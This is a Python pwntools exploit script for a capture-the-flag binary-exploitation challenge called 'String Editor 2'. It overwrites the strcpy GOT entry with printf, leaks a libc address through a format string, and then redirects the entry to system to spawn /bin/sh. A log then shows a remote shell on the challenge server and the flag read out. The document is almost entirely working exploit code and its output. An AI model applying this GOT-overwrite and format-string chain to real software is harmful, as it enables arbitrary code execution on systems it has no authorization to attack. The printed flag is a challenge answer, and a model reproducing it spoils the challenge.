from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './string_editor_2'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "chal.imaginaryctf.org"
  PORT = 42005
  s = remote(HOST, PORT)
  libc = ELF('./libc.so.6')
else:
  #s = process(BINARY)
  #libc = elf.libc 
  s = process(BINARY, env={'LD_PRELOAD': './libc.so.6'})
  libc = ELF('./libc.so.6')

def Edit(pos, data):
  s.recvuntil("What character would you like to edit? (enter in 15 to see utils)\n")
  s.sendline(str(pos))
  s.recvuntil("What character should be in that index?\n")
  s.sendline(data)

def Edit_8bytes(pos, data):
  for i in range(8):
    d0 = (data >> (i*8)) & 0xff
    Edit(pos+i, bytes([d0]))

def Delete_string():
  s.recvuntil("What character would you like to edit? (enter in 15 to see utils)\n")
  s.sendline("15")
  s.recvuntil("3. Exit\n")
  s.sendline("2")

# GOT overwrite, strcpy => printf
Edit_8bytes(elf.got.strcpy - elf.sym.target, elf.plt.printf)

# libc leak
Edit_8bytes(0, u64("%13$p---"))
Delete_string()

libc_leak = int(s.recvuntil("-")[:-1], 16)
libc_base = libc_leak - 0x270b3
system_addr = libc_base + libc.sym.system
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

# GOT overwrite, printf => system
Edit_8bytes(elf.got.strcpy - elf.sym.target, system_addr)

Edit_8bytes(0, u64("/bin/sh\x00"))

# Start /bin/sh
Delete_string()

s.interactive()

'''
mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_String_Editor_2_300$ python3 solve.py r
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_String_Editor_2_300/string_editor_2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to chal.imaginaryctf.org on port 42005: Done
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_String_Editor_2_300/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
libc_leak = 0x7f3afc5d10b3
libc_base = 0x7f3afc5aa000
[*] Switching to interactive mode
$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 16
-rwxr--r-- 1 nobody nogroup   54 Jul 26 14:33 flag.txt
-rwxr-xr-x 1 nobody nogroup 8736 Jul 26 14:33 run
$ cat flag.txt
ictf{g0t_0v3rwr1te?????????????????????????_953a20b1}
'''
